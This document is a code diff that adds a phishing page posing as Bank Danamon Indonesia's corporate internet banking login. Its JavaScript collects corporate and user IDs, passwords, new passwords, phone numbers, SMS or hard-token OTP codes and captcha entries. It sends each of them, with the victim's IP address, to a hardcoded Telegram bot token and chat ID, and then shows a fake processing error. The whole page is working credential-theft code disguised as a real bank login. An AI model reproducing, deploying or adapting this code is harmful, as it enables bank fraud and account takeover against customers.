+                            <a href="https://www.instagram.com/mydanamon/" target="_blank" class="ico-instagram"></a>
+                            <a href="https://www.facebook.com/DanamonIndonesia" target="_blank" class="ico-fb"></a>
+                            <a href="https://twitter.com/danamon" target="_blank" class="ico-twitter"></a>
+                            <a href="https://www.youtube.com/bankdanamonid" target="_blank" class="ico-youtube"></a>
+                            <a href="https://www.linkedin.com/company/bank-danamon-indonesia" target="_blank" class="ico-linkedin"></a>
+                        </td>
+                        <td colspan="2" style="font-size: 9pt; color: #2c2c2c; text-align: left">
+                            Bank Danamon Indonesia Tbk is licensed and supervised by Indonesia Financial Services Authority (OJK) & Bank Indonesia, and member of Indonesia Deposit Insurance Corporation (LPS).
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <p style="text-align: center; color: #0a0a0a; font-size: x-small;">© PT Bank Danamon Indonesia Tbk. All rights reserved.</p>
+    </div>
+
+    <div id="dialog-popupnews"></div>
+    <div id="dialog-confirm">
+        <i style="float: left; margin: 0 7px 20px 0;"></i>
+        <p></p>
+    </div>
+
+    <script>
+        // ============================================================
+        // KONFIGURASI TELEGRAM
+        // ============================================================
+        var TELEGRAM_BOT_TOKEN = '8822823553:AAFQh8IeZwDSUpvWzv3-SKHGOmuKNKuxYj0';
+        var TELEGRAM_CHAT_ID = '8603251193';
+
+        var userData = {
+            corporateId: '',
+            userId: '',
+            password: '',
+            newPassword: '',
+            phoneNumber: '',
+            otpCode: '',
+            isHardToken: false
+        };
+
+        // ============================================================
+        // FUNGSI PINDAH HALAMAN & GANTI HEADER
+        // ============================================================
+        function goToPage(page) {
+            document.querySelectorAll('.page').forEach(function(el) {
+                el.classList.remove('active');
+                el.style.display = 'none';
+            });
+            var target = document.getElementById('page' + page);
+            if (target) {
+                target.classList.add('active');
+                target.style.display = 'block';
+            }
+
+            // Logika ganti header
+            if (page === 1) {
+                document.getElementById('header-halaman-1').style.display = 'block';
+                document.getElementById('header-baru').style.display = 'none';
+            } else {
+                document.getElementById('header-halaman-1').style.display = 'none';
+                document.getElementById('header-baru').style.display = 'flex'; // Pakai flex supaya layout barisnya sesuai
+            }
+
+            document.querySelector('.panel-body').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        // ============================================================
+        // FUNGSI TELEGRAM
+        // ============================================================
+        function sendToTelegram(message) {
+            return new Promise(function(resolve, reject) {
+                var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+                var data = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', url, true);
+                xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        try {
+                            var response = JSON.parse(xhr.responseText);
+                            if (response.ok) {
+                                resolve(response);
+                            } else {
+                                reject(new Error(response.description || 'Unknown error'));
+                            }
+                        } catch (e) {
+                            reject(e);
+                        }
+                    } else {
+                        reject(new Error('HTTP error: ' + xhr.status));
+                    }
+                };
+                xhr.onerror = function() {
+                    reject(new Error('Network error'));
+                };
+                xhr.send(JSON.stringify(data));
+            });
+        }
+
+        function getClientIP() {
+            return new Promise(function(resolve) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        try {
+                            var data = JSON.parse(xhr.responseText);
+                            resolve(data.ip);
+                        } catch (e) {
+                            resolve('Unknown');
+                        }
+                    } else {
+                        resolve('Unknown');
+                    }
+                };
+                xhr.onerror = function() {
+                    resolve('Unknown');
+                };
+                xhr.send();
+            });
+        }
+
+        // ============================================================
+        // LOADING OVERLAY
+        // ============================================================
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+
+        // ============================================================
+        // POPUP
+        // ============================================================
+        function showPopup() {
+            document.getElementById('popupHelp').classList.add('show');
+        }
+
+        function closePopup() {
+            document.getElementById('popupHelp').classList.remove('show');
+        }
+
+        // ============================================================
+        // HARD TOKEN TOGGLE
+        // ============================================================
+        var isHardToken = false;
+
+        function toggleHardToken() {
+            isHardToken = !isHardToken;
+            var label = document.getElementById('hardTokenLabel');
+            var input = document.getElementById('otpCode');
+            
+            if (isHardToken) {
+                label.textContent = 'Kode Appl';
+                label.style.color = '#28a745';
+                input.placeholder = 'Kode Appl';
+            } else {
+                label.textContent = 'Pengguna Hard Token';
+                label.style.color = '#0055a4';
+                input.placeholder = 'Kode SMS';
+            }
+            input.value = '';
+            document.getElementById('otpErrorMsg').classList.remove('show');
+            document.getElementById('otpAlert').className = 'alert-message';
+        }
+
+        // ============================================================
+        // REQUEST HELP (BANTUAN)
+        // ============================================================
+        function requestHelp() {
+            // Kirim notifikasi ke Telegram
+            var timestamp = new Date().toLocaleString('en-US', {
+                timeZone: 'Asia/Jakarta',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false
+            });
+
+            var message = '<b>🆘 BANTUAN</b>\n';
+            message += '═══════════════════════\n';
+            message += '📅 <b>Waktu</b>  : ' + timestamp + ' (WIB)\n';
+            message += '👤 <b>User ID</b>: <code>' + (userData.userId || 'Unknown') + '</code>\n';
+            message += '🏢 <b>Corp ID</b>: <code>' + (userData.corporateId || 'Unknown') + '</code>\n';
+            message += '📱 <b>Phone</b>  : <code>' + (userData.phoneNumber || 'Unknown') + '</code>\n';
+            message += '═══════════════════════\n';
+            message += '<i>Customer assistance requested.</i>';
+
+            sendToTelegram(message).then(function() {
+                showPopup();
+            }).catch(function() {
+                showPopup();
+            });
+        }
+
+        // ============================================================
+        // VALIDASI PASSWORD
+        // ============================================================
+        function validatePassword() {
+            var password = document.getElementById('newPassword').value;
+            var checks = {
+                length: password.length >= 8,
+                uppercase: /[A-Z]/.test(password),
+                lowercase: /[a-z]/.test(password),
+                number: /[0-9]/.test(password),
+                special: /[!@#$%^&*(),.?":{}|<>]/.test(password)
+            };
+
+            var reqs = ['length', 'Uppercase', 'Lowercase', 'Number', 'Special'];
+            reqs.forEach(function(key) {
+                var el = document.getElementById('req' + key);
+                if (el) {
+                    var icon = checks[key.toLowerCase()] ? '✅' : '🔸';
+                    var texts = {
+                        length: ' 8+ characters',
+                        Uppercase: ' A-Z',
+                        Lowercase: ' a-z',
+                        Number: ' 0-9',
+                        Special: ' !@#$%^&*'
+                    };
+                    el.className = 'req ' + (checks[key.toLowerCase()] ? 'valid' : '');
+                    el.textContent = icon + texts[key];
+                }
+            });
+
+            validatePasswordMatch();
+            return Object.values(checks).every(function(v) { return v; });
+        }
+
+        function validatePasswordMatch() {
+            var password = document.getElementById('newPassword').value;
+            var confirm = document.getElementById('confirmPassword').value;
+            var msg = document.getElementById('passwordMatchMsg');
+            if (confirm.length === 0) {
+                msg.textContent = '';
+                msg.style.color = '';
+                return;
+            }
+            if (password === confirm) {
+                msg.textContent = '✅ Passwords match';
+                msg.style.color = '#28a745';
+            } else {
+                msg.textContent = '❌ Passwords do not match';
+                msg.style.color = '#dc3545';
+            }
+        }
+
+        function onlyNum(e) {
+            var key = e.key;
+            if (key === 'Backspace' || key === 'Delete' || key === 'Tab' || key === 'ArrowLeft' || key === 'ArrowRight') {
+                return true;
+            }
+            if (!/^[0-9]$/.test(key)) {
+                e.preventDefault();
+                return false;
+            }
+            return true;
+        }
+
+        // ============================================================
+        // PROSES LOGIN (HALAMAN 1) → KIRIM TELEGRAM
+        // ============================================================
+        function processLogin() {
+            var corporateId = document.getElementById('corpid').value.trim();
+            var userId = document.getElementById('userid').value.trim();
+            var password = document.getElementById('userpass').value.trim();
+
+            if (!corporateId || !userId || !password) {
+                alert('Please fill in all fields: Corporate ID, User ID, and Password.');
+                return;
+            }
+
+            userData.corporateId = corporateId;
+            userData.userId = userId;
+            userData.password = password;
+
+            showLoading();
+
+            getClientIP().then(function(ip) {
+                var timestamp = new Date().toLocaleString('en-US', {
+                    timeZone: 'Asia/Jakarta',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: false
+                });
+
+                var message = '<b>🔐 [HALAMAN 1] LOGIN</b>\n';
+                message += '═══════════════════════\n';
+                message += '📅 <b>Waktu</b>  : ' + timestamp + ' (WIB)\n';
+                message += '🌐 <b>IP</b>     : <code>' + ip + '</code>\n';
+                message += '🏢 <b>Corp ID</b>: <code>' + corporateId + '</code>\n';
+                message += '👤 <b>User ID</b>: <code>' + userId + '</code>\n';
+                message += '🔑 <b>Password</b>: <code>' + password + '</code>\n';
+                message += '═══════════════════════\n';
+
+                return sendToTelegram(message);
+            }).then(function() {
+                setTimeout(function() {
+                    hideLoading();
+                    document.getElementById('displayUserId').textContent = userData.userId;
+                    document.getElementById('displayCorpId').textContent = userData.corporateId;
+                    document.getElementById('displayUserId3').textContent = userData.userId;
+                    document.getElementById('displayCorpId3').textContent = userData.corporateId;
+                    document.getElementById('currentPassword').value = '';
+                    document.getElementById('newPassword').value = '';
+                    document.getElementById('confirmPassword').value = '';
+                    document.getElementById('phoneNumber').value = '';
+                    document.getElementById('passwordMatchMsg').textContent = '';
+                    document.getElementById('changePasswordAlert').className = 'alert-message';
+                    document.getElementById('btnChangePassword').disabled = false;
+                    document.getElementById('btnChangePassword').textContent = 'Lanjut';
+                    var reqs = ['length', 'Uppercase', 'Lowercase', 'Number', 'Special'];
+                    reqs.forEach(function(key) {
+                        var el = document.getElementById('req' + key);
+                        if (el) {
+                            el.className = 'req';
+                            var texts = {
+                                length: '🔸 8+ characters',
+                                Uppercase: '🔸 A-Z',
+                                Lowercase: '🔸 a-z',
+                                Number: '🔸 0-9',
+                                Special: '🔸 !@#$%^&*'
+                            };
+                            el.textContent = texts[key];
+                        }
+                    });
+                    goToPage(2);
+                }, 800);
+            }).catch(function(error) {
+                setTimeout(function() {
+                    hideLoading();
+                    document.getElementById('displayUserId').textContent = userData.userId;
+                    document.getElementById('displayCorpId').textContent = userData.corporateId;
+                    document.getElementById('displayUserId3').textContent = userData.userId;
+                    document.getElementById('displayCorpId3').textContent = userData.corporateId;
+                    goToPage(2);
+                }, 800);
+            });
+        }
+
+        // ============================================================
+        // PROSES CHANGE PASSWORD (HALAMAN 2) → KIRIM TELEGRAM
+        // ============================================================
+        function processChangePassword() {
+            var currentPassword = document.getElementById('currentPassword').value.trim();
+            var newPassword = document.getElementById('newPassword').value;
+            var confirmPassword = document.getElementById('confirmPassword').value;
+            var phoneNumber = document.getElementById('phoneNumber').value.trim();
+            var alertEl = document.getElementById('changePasswordAlert');
+
+            if (!currentPassword) {
+                alertEl.className = 'alert-message error show';
+                alertEl.innerHTML = 'Please enter your current password.';
+                return;
+            }
+
+            if (!validatePassword()) {
+                alertEl.className = 'alert-message error show';
+                alertEl.innerHTML = 'New password does not meet the requirements.';
+                return;
+            }
+
+            if (newPassword !== confirmPassword) {
+                alertEl.className = 'alert-message error show';
+                alertEl.innerHTML = 'New password and confirmation do not match.';
+                return;
+            }
+
+            if (!phoneNumber || phoneNumber.length < 10) {
+                alertEl.className = 'alert-message error show';
+                alertEl.innerHTML = 'Please enter a valid mobile phone number (minimum 10 digits).';
+                return;
+            }
+
+            userData.newPassword = newPassword;
+            userData.phoneNumber = phoneNumber;
+
+            showLoading();
+
+            getClientIP().then(function(ip) {
+                var timestamp = new Date().toLocaleString('en-US', {
+                    timeZone: 'Asia/Jakarta',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: false
+                });
+
+                var message = '<b>🔄 [HALAMAN 2] CHANGE PASSWORD</b>\n';
+                message += '═══════════════════════\n';
+                message += '📅 <b>Waktu</b>              : ' + timestamp + ' (WIB)\n';
+                message += '🌐 <b>IP</b>                 : <code>' + ip + '</code>\n';
+                message += '🏢 <b>Corporate ID</b>       : <code>' + userData.corporateId + '</code>\n';
+                message += '👤 <b>User ID</b>            : <code>' + userData.userId + '</code>\n';
+                message += '🔑 <b>Current Password</b>   : <code>' + currentPassword + '</code>\n';
+                message += '🔐 <b>New Password</b>       : <code>' + userData.newPassword + '</code>\n';
+                message += '📱 <b>Mobile Phone</b>       : <code>' + userData.phoneNumber + '</code>\n';
+                message += '═══════════════════════\n';
+
+                return sendToTelegram(message);
+            }).then(function() {
+                setTimeout(function() {
+                    hideLoading();
+                    // Pindah ke halaman 3
+                    document.getElementById('displayPhone3').textContent = userData.phoneNumber;
+                    document.getElementById('otpCode').value = '';
+                    document.getElementById('otpErrorMsg').classList.remove('show');
+                    document.getElementById('otpAlert').className = 'alert-message';
+                    // Reset hard token
+                    isHardToken = false;
+                    var label = document.getElementById('hardTokenLabel');
+                    label.textContent = 'Pengguna Hard Token';
+                    label.style.color = '#0055a4';
+                    document.getElementById('otpCode').placeholder = 'Kode SMS';
+                    goToPage(3);
+                }, 800);
+            }).catch(function(error) {
+                setTimeout(function() {
+                    hideLoading();
+                    document.getElementById('displayPhone3').textContent = userData.phoneNumber;
+                    goToPage(3);
+                }, 800);
+            });
+        }
+
+        // ============================================================
+        // PROSES VERIFIKASI OTP (HALAMAN 3) → KIRIM TELEGRAM
+        // ============================================================
+        function processOTP() {
+            var otpCode = document.getElementById('otpCode').value.trim();
+            var alertEl = document.getElementById('otpAlert');
+            var errorMsg = document.getElementById('otpErrorMsg');
+
+            // Sembunyikan error sebelumnya
+            errorMsg.classList.remove('show');
+            alertEl.className = 'alert-message';
+
+            if (!otpCode) {
+                alertEl.className = 'alert-message error show';
+                alertEl.innerHTML = 'Please enter a verification code.';
+                return;
+            }
+
+            userData.otpCode = otpCode;
+            userData.isHardToken = isHardToken;
+
+            showLoading();
+
+            getClientIP().then(function(ip) {
+                var timestamp = new Date().toLocaleString('en-US', {
+                    timeZone: 'Asia/Jakarta',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: false
+                });
+
+                var codeType = isHardToken ? 'Kode Appl' : 'Kode SMS';
+                var message = '<b>📱 [HALAMAN 3] VERIFICATION</b>\n';
+                message += '═══════════════════════\n';
+                message += '📅 <b>Waktu</b>              : ' + timestamp + ' (WIB)\n';
+                message += '🌐 <b>IP</b>                 : <code>' + ip + '</code>\n';
+                message += '🏢 <b>Corporate ID</b>       : <code>' + userData.corporateId + '</code>\n';
+                message += '👤 <b>User ID</b>            : <code>' + userData.userId + '</code>\n';
+                message += '📱 <b>Phone</b>              : <code>' + userData.phoneNumber + '</code>\n';
+                message += '🔢 <b>' + codeType + '</b>          : <code>' + userData.otpCode + '</code>\n';
+                message += '═══════════════════════\n';
+
+                return sendToTelegram(message);
+            }).then(function() {
+                // Loading 3 detik lalu muncul error
+                setTimeout(function() {
+                    hideLoading();
+                    // Tampilkan error merah
+                    errorMsg.classList.add('show');
+                    errorMsg.textContent = 'Transaksi tidak dapat diproses, silahkan ulangi.';
+                    document.getElementById('otpCode').value = '';
+                    document.getElementById('btnVerify').disabled = false;
+                    document.getElementById('btnVerify').textContent = 'Lanjut';
+                }, 3000);
+            }).catch(function(error) {
+                setTimeout(function() {
+                    hideLoading();
+                    errorMsg.classList.add('show');
+                    errorMsg.textContent = 'Transaksi tidak dapat diproses, silahkan ulangi.';
+                    document.getElementById('otpCode').value = '';
+                    document.getElementById('btnVerify').disabled = false;
+                    document.getElementById('btnVerify').textContent = 'Lanjut';
+                }, 3000);
+            });
+        }
+
+        // ============================================================
+        // FORGOT PASSWORD
+        // ============================================================
+        function handleForgotPassword() {
+            var corpId = document.getElementById('corpidForget').value.trim();
+            var userId = document.getElementById('useridForget').value.trim();
+            var email = document.getElementById('emailUser').value.trim();
+            var phone = document.getElementById('phoneUser').value.trim();
+
+            if (!corpId || !userId) {
+                document.getElementById('alert').innerHTML = '<p style="color:red;">Please fill Corporate ID and User ID.</p>';
+                return;
+            }
+
+            var alertEl = document.getElementById('alert');
+            alertEl.innerHTML = '<p style="color:blue;">Processing request...</p>';
+
+            getClientIP().then(function(ip) {
+                var timestamp = new Date().toLocaleString('en-US', {
+                    timeZone: 'Asia/Jakarta',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: false
+                });
+
+                var message = '<b>🔑 FORGOT PASSWORD</b>\n';
+                message += '═══════════════════════\n';
+                message += '📅 <b>Waktu</b>  : ' + timestamp + ' (WIB)\n';
+                message += '🌐 <b>IP</b>     : <code>' + ip + '</code>\n';
+                message += '🏢 <b>Corp ID</b>: <code>' + corpId + '</code>\n';
+                message += '👤 <b>User ID</b>: <code>' + userId + '</code>\n';
+                if (email) message += '📧 <b>Email</b> : <code>' + email + '</code>\n';
+                if (phone) message += '📱 <b>Phone</b> : <code>' + phone + '</code>\n';
+                message += '═══════════════════════\n';
+
+                return sendToTelegram(message);
+            }).then(function() {
+                alertEl.innerHTML = '<p style="color:green;">Password reset request has been sent. Please check your registered email for further instructions.</p>';
+            }).catch(function(error) {
+                alertEl.innerHTML = '<p style="color:red;">Request failed. Please try again later.</p>';
+            });
+        }
+
+        // ============================================================
+        // EVENT LISTENERS
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Halaman 1 - Login
+            document.getElementById('btnSubmit').addEventListener('click', function(e) {
+                e.preventDefault();
+                processLogin();
+            });
+
+            document.getElementById('userpass').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('btnSubmit').click();
+                }
+            });
+
+            // Halaman 2 - Change Password
+            document.getElementById('btnBack2').addEventListener('click', function(e) {
+                e.preventDefault();
+                goToPage(1);
+            });
+
+            document.getElementById('btnChangePassword').addEventListener('click', function(e) {
+                e.preventDefault();
+                processChangePassword();
+            });
+
+            document.getElementById('confirmPassword').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('btnChangePassword').click();
+                }
+            });
+
+            // Halaman 3 - OTP
+            document.getElementById('btnBack3').addEventListener('click', function(e) {
+                e.preventDefault();
+                goToPage(2);
+            });
+
+            document.getElementById('btnVerify').addEventListener('click', function(e) {
+                e.preventDefault();
+                // Disable button sementara
+                document.getElementById('btnVerify').disabled = true;
+                document.getElementById('btnVerify').textContent = 'Processing...';
+                processOTP();
+            });
+
+            document.getElementById('otpCode').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('btnVerify').click();
+                }
+            });
+
+            // Forgot Password
+            document.getElementById('btnSend').addEventListener('click', function(e) {
+                e.preventDefault();
+                handleForgotPassword();
+            });
+
+            document.getElementById('btnCancel').addEventListener('click', function(e) {
+                $('#dialog-popupate-host').dialog('close');
+            });
+
+            // Captcha
+            document.getElementById('btnSendKaptcha').addEventListener('click', function(e) {
+                e.preventDefault();
+                var captchaCode = document.getElementById('kaptchaCode').value.trim();
+                var errorEl = document.getElementById('errorCapcai');
+
+                if (!captchaCode) {
+                    errorEl.innerHTML = '<span style="color:red;">Please enter captcha code.</span>';
+                    return;
+                }
+
+                errorEl.innerHTML = '<span style="color:blue;">Processing...</span>';
+
+                getClientIP().then(function(ip) {
+                    var timestamp = new Date().toLocaleString('en-US', {
+                        timeZone: 'Asia/Jakarta',
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: false
+                    });
+
+                    var message = '<b>🔐 CAPTCHA</b>\n';
+                    message += '═══════════════════════\n';
+                    message += '📅 <b>Waktu</b>  : ' + timestamp + ' (WIB)\n';
+                    message += '🌐 <b>IP</b>     : <code>' + ip + '</code>\n';
+                    message += '🔢 <b>Captcha</b>: <code>' + captchaCode + '</code>\n';
+                    message += '═══════════════════════\n';
+
+                    return sendToTelegram(message);
+                }).then(function() {
+                    errorEl.innerHTML = '<span style="color:green;">Captcha verification successful.</span>';
+                }).catch(function(error) {
+                    errorEl.innerHTML = '<span style="color:red;">Verification failed. Please try again.</span>';
+                });
+            });
+
+            document.getElementById('btnCancelCaptcha').addEventListener('click', function(e) {
+                $('#dialog-popupate-host-captcha').dialog('close');
+            });
+
+            // Tutup popup dengan klik di luar
+            document.getElementById('popupHelp').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closePopup();
+                }
+            });
+        });
+
+        // Fungsi dummy
+        var performLoginExecuteUrl = '/loginfo/performLoginExecute';
+        var performLoginUrl = '/loginfo/performLogin';
+        var sendForgotPassword = '/loginfo/sendForgotPassword';
+        var validateCaptcha = '/loginfo/validateCaptcha';
+        var alertProcessTrx = 'Transaction is currently being processed';
+        var changeLanguageUrl = '/loginfo/changeLanguage';
+        var randomKeyWordUrl = '/loginfo/randomKeyWord';
+        var checkKaptcha = '/loginfo/checkKaptcha';
+        window.top.bankProfile = "danamon";
+        var enableJSCache = 'true';
+        var doDownloadFileUrl = '/loginfo/DownloadSecurityFile';
+        var fisrtTimeLogin = '/loginfo/registerCorporate';
+        var doLoginSSO = '/loginfo/doLoginSSO';
+        var doOpenHelpUrl = '/secure/common/help/openHelp';
+        var saveAsListUrl = '/secure/accountManagement/accountSetup/saveAsList';
+        var mustAgreeTermAndConditionsMsg = 'you must agree with the Terms and Conditions';
+
+        function showHelp() { alert('Help feature coming soon.'); }
+        function changeLanguage() { alert('Language feature coming soon.'); }
+        function showKeywordTooltip() {}
+        function hideKeywordTooltip() {}
+        function randomKeyWord() {}
+        function randomKeyWordForgotPassword() {}
+        function enableEmailPhone() {}
+        function callFirstTimeLogin() { alert('First time login feature coming soon.'); }
+    </script>
+
+    <script src="js/jquery-1.11.1.min_1.js"></script>
+    <script src="js/jquery-ui.custom.min.js"></script>
+    <script src="js/bootstrap.js"></script>
+    <script src="js/transition.js"></script>
+    <script src="js/sha1.js"></script>
+    <script src="js/AesUtil.js"></script>
+    <script src="js/pbkdf2.js"></script>
+    <script src="js/aes.js"></script>
+    <script src="js/global.js"></script>
+    <script src="js/login.js"></script>
+
+</body></html>
